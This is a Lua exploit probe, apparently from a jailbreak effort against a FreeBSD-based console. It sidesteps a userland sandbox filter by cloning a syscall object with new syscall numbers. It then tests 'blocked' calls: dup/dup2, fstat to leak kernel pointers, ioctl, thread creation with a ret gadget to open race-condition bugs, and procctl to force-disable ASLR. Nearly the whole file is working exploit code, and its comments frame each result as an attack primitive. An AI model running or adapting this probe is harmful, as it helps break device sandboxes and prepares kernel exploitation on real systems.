-- CRASH_CLASS: MODERATE
-- PROBE 43e: Re-test "blocked" syscalls via make_syscall
--
-- The sandbox filter is in syscall.resolve(), NOT the kernel.
-- Proven by sysctl(202) working via make_syscall while resolve()
-- reports it blocked. This probe tests every important "blocked"
-- syscall through the raw make_syscall path.
--
-- If thr_new(455) works: entire race condition bug class opens up.
-- If ioctl(54) works: massive kernel attack surface.
-- If dup/dup2 work: fd manipulation primitives.

print("=== PROBE 43e: BLOCKED SYSCALL BYPASS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local results = {}
local function record(name, num, rv, note)
    results[#results + 1] = {name=name, num=num, rv=rv, note=note}
    print(string.format("  %-20s (%3d): ret=%-6d %s", name, num, rv, note or ""))
end

--------------------------------------------------------------------
-- A) dup / dup2 — fd manipulation
--------------------------------------------------------------------
print("")
print("=== A: DUP/DUP2 ===")
do
    -- dup(41) with fd 0 (stdin-ish, whatever the loader gives us)
    local sc_dup = make_syscall(41)
    local ok, ret = pcall(function() return sc_dup(uint64(0)) end)
    local rv = ok and to_num(ret) or -999
    record("dup", 41, rv, rv >= 0 and "NEW FD=" .. rv or "")

    -- dup2(90) — dup fd 0 to fd 100
    local sc_dup2 = make_syscall(90)
    ok, ret = pcall(function() return sc_dup2(uint64(0), uint64(100)) end)
    rv = ok and to_num(ret) or -999
    record("dup2", 90, rv)
end

--------------------------------------------------------------------
-- B) fstat(189) — kernel pointer leak from stat buffer
--------------------------------------------------------------------
print("")
print("=== B: FSTAT ===")
do
    local sc_fstat = make_syscall(189)
    local stat_buf = memory.alloc(0x100)
    for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end

    -- fstat on various fds
    local fds = {0, 3, 4, 5}  -- 0=stdin?, 3-5=likely sockets
    for _, fd in ipairs(fds) do
        for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
        local ok, ret = pcall(function()
            return sc_fstat(uint64(fd), uint64(stat_buf))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  fstat(%d): ret=%d", fd, rv))

        if rv == 0 then
            -- struct stat layout (FreeBSD amd64):
            -- +0x00: st_dev (8)
            -- +0x08: st_ino (8) *** may contain kernel address for sockets
            -- +0x10: st_mode (4)
            -- +0x18: st_nlink (8)
            -- +0x30: st_size (8)
            for off = 0, 0x70, 8 do
                local q = safe_rq(stat_buf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h ~= 0 or l ~= 0 then
                        local tag = ""
                        if h >= 0xFFFF8000 then tag = " *** KPTR ***" end
                        print(string.format("    +%02X: %08X_%08X%s", off, h, l, tag))
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- C) ioctl(54) — device control
--------------------------------------------------------------------
print("")
print("=== C: IOCTL ===")
do
    local sc_ioctl = make_syscall(54)
    -- Try FIONREAD (0x4004667F) on a socket fd
    local buf = memory.alloc(16)
    safe_wd(buf, 0)

    local ok, ret = pcall(function()
        return sc_ioctl(uint64(3), uint64(0x4004667F), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rd(buf) or -1
    record("ioctl FIONREAD", 54, rv, "val=" .. val)

    -- Try TIOCGETA (0x402C7413) — terminal attributes
    for off = 0, 12, 4 do safe_wd(buf + off, 0) end
    ok, ret = pcall(function()
        return sc_ioctl(uint64(0), uint64(0x402C7413), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("ioctl TIOCGETA", 54, rv)

    -- Try SIOCGIFADDR on a socket — get interface address
    ok, ret = pcall(function()
        return sc_ioctl(uint64(3), uint64(0xC0206921), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("ioctl SIOCGIFADDR", 54, rv)
end

--------------------------------------------------------------------
-- D) thr_new(455) — THE BIG ONE
--------------------------------------------------------------------
print("")
print("=== D: THR_NEW ===")
do
    local sc_thr_new = make_syscall(455)

    -- struct thr_param for thr_new
    -- We need a valid stack and entry point
    -- Allocate a stack
    local stack_size = 0x10000
    local sc_mmap = make_syscall(477)
    local stack
    pcall(function()
        stack = sc_mmap(uint64(0), uint64(stack_size), uint64(3), -- RW
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if stack then
        local stack_h, stack_l = get_hi_lo(stack)
        print("  stack allocated: " .. string.format("%08X_%08X", stack_h, stack_l))

        -- struct thr_param (FreeBSD):
        -- void (*start_func)(void*) +0x00
        -- void *arg                +0x08
        -- char *stack_base         +0x10
        -- size_t stack_size        +0x18
        -- char *tls_base           +0x20
        -- size_t tls_size          +0x28
        -- long *child_tid          +0x30
        -- long *parent_tid         +0x38
        -- int flags                +0x40
        -- struct rtprio *rtp       +0x48
        local param = memory.alloc(0x60)
        for off = 0, 0x5C, 4 do safe_wd(param + off, 0) end

        -- For start_func, use a simple ret gadget from eboot
        -- We don't actually want the thread to run — just see if
        -- thr_new returns success
        local sc_dynlib_get_info = make_syscall(593)
        local info = memory.alloc(0x200)
        safe_wd(info, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(0), info) end)
        local eb_tl = safe_rd(info + 0x108) or 0
        local eb_th = safe_rd(info + 0x10C) or 0
        -- ret gadget at eboot+0x42
        local ret_gadget = uint64(string.format("0x%X%08X", eb_th, eb_tl + 0x42))

        safe_wq(param, ret_gadget)       -- start_func = ret
        safe_wq(param + 0x08, uint64(0)) -- arg = NULL
        safe_wq(param + 0x10, stack)     -- stack_base
        safe_wq(param + 0x18, uint64(stack_size)) -- stack_size

        local tid_buf = memory.alloc(8)
        safe_wq(tid_buf, uint64(0))
        safe_wq(param + 0x30, uint64(tid_buf)) -- child_tid

        local ok, ret = pcall(function()
            return sc_thr_new(uint64(param), uint64(0x50))
        end)
        local rv = ok and to_num(ret) or -999
        local child_tid = safe_rq(tid_buf)
        local th, tl = 0, 0
        if child_tid then th, tl = get_hi_lo(child_tid) end

        print(string.format("  thr_new: ret=%d child_tid=%08X_%08X", rv, th, tl))
        if rv == 0 then
            print("  *** THREADING WORKS VIA MAKE_SYSCALL ***")
            print("  Race conditions are now possible!")
        end

        record("thr_new", 455, rv, rv == 0 and "THREAD CREATED" or "")
    else
        print("  could not allocate stack")
        record("thr_new", 455, -1, "no stack")
    end
end

--------------------------------------------------------------------
-- E) pipe2(542) — different number than pipe(42)
--------------------------------------------------------------------
print("")
print("=== E: PIPE2 ===")
do
    local sc_pipe2 = make_syscall(542)
    local fds = memory.alloc(16)
    safe_wd(fds, 0)
    safe_wd(fds + 4, 0)

    -- pipe2(fds, 0) — flags=0 means same as pipe()
    local ok, ret = pcall(function()
        return sc_pipe2(uint64(fds), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local fd0 = safe_rd(fds) or -1
    local fd1 = safe_rd(fds + 4) or -1
    record("pipe2", 542, rv, "fds=" .. fd0 .. "," .. fd1)
end

--------------------------------------------------------------------
-- F) procctl(544) — process control
--------------------------------------------------------------------
print("")
print("=== F: PROCCTL ===")
do
    local sc_procctl = make_syscall(544)
    local buf = memory.alloc(16)

    -- PROC_ASLR_STATUS (13) — get ASLR mode
    safe_wd(buf, 0)
    local ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(13), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rd(buf) or -1
    record("procctl ASLR_STATUS", 544, rv, "val=" .. val)

    -- PROC_ASLR_CTL (12) — try to disable ASLR
    -- PROC_ASLR_FORCE_DISABLE = 1
    safe_wd(buf, 1)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(12), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl ASLR_CTL(disable)", 544, rv)

    -- PROC_TRACE_CTL (7) — control tracing
    safe_wd(buf, 0)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(7), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl TRACE_CTL", 544, rv)

    -- PROC_REAP_ACQUIRE (2)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(2), uint64(0))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl REAP_ACQUIRE", 544, rv)
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== BYPASS SUMMARY ===")
local worked = 0
for _, r in ipairs(results) do
    if r.rv >= 0 and r.rv ~= 0xFFFFFFFF then
        print(string.format("  WORKS: %-20s (%3d) ret=%d %s", r.name, r.num, r.rv, r.note or ""))
        worked = worked + 1
    end
end
print("syscalls unblocked via make_syscall: " .. worked)

print("")
print("=== PROBE 43e COMPLETE ===")
